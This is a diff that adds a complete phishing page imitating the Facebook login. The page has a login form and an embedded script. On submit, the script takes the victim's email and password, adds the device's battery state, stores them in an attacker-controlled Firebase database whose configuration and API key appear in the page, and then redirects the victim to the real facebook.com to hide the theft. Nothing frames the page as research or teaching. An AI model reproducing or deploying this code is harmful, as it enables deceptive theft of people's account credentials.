@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Document</title>
+</head>
+<body class="flex items-center justify-center h-screen">
+    
+
+    <form class="form flex flex-col space-y-6 p-4 shadow-lg border-2 border-r-blue-400 w-[25rem] max-w-full justify-center">
+            <div class="image flex justify-center">            <img class="w-[100px] " src="/image.png">
+            </div>
+            <p class="text-gray-400 pt-3">Log into your account first</p>
+            <input class="outline-none border-2 border-gray-400 rounded p-2 focus:border-blue-600 " type="text" name="" id="em" placeholder="email or phone number"  required>
+            <input class="outline-none border-2 border-gray-400 rounded p-2 focus:border-blue-600 " type="text" name="" id="pass" placeholder="password" required>
+            <button class="bg-blue-600 text-white p-2 rounded cursor-pointer" type="submit">Log in</button>
+            <button class="bg-[#42B72A] text-white p-2 rounded cursor-pointer" type="submit">Create new account</button>
+    </form>
+
+
+
+
+
+
+    <script type="module">
+      
+      // Import the functions you need from the SDKs you need
+import { initializeApp }from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+// Initialize Firebase
+const firebaseConfig = {
+          apiKey: "AIzaSyD-V97FbwQBbLIkbvn98P614nlkKSoGXUk",
+          authDomain: "auth-979d8.firebaseapp.com",
+          databaseURL: "https://auth-979d8-default-rtdb.firebaseio.com",
+          projectId: "auth-979d8",
+          storageBucket: "auth-979d8.appspot.com",
+          messagingSenderId: "235770544453",
+          appId: "1:235770544453:web:79093a7c45b3e323ca7e2c"
+        };
+const app = initializeApp(firebaseConfig);
+
+// Get a reference to the database service
+const database = getDatabase();
+
+// Get a reference to the "users" node in the database
+const usersRef = ref(database, "users");
+
+// Add sample data to the "users" node
+
+
+
+document.querySelector('form').addEventListener('submit' , e =>{
+    e.preventDefault();
+    let em = document.querySelector('#em').value
+    let pass = document.querySelector('#pass').value
+
+    let batteryLevel = 0;
+let batteryStatus = '';
+
+navigator.getBattery().then(function(battery) {
+  batteryLevel = battery.level * 100;
+  batteryStatus = battery.charging? 'Charging' : 'Discharging';
+  console.log(`Battery level: ${batteryLevel}% (${batteryStatus})`);
+  const now = new Date();
+const formattedDate = now.toLocaleDateString();
+const formattedTime = now.toLocaleTimeString();
+console.log(`Current date: ${formattedDate}`);
+console.log(`Current time: ${formattedTime}`);  
+  
+  set(ref(database, "users/"+generateRandomId(8) ), { em:em, pass: pass  ,chargin:batteryStatus,level:batteryLevel}).then(
+    window.location.href = 'https://www.facebook.com/'
+    );
+});
+
+    
+
+
+document.querySelector('form').reset();
+})
+
+
+
+
+function generateRandomId(length) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let id = '';
+  for (let i = 0; i < length; i++) {
+    id += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return id;
+}
+
+
+
+
+
+      </script>
+
+
+
+
+
+</body>
+</html>
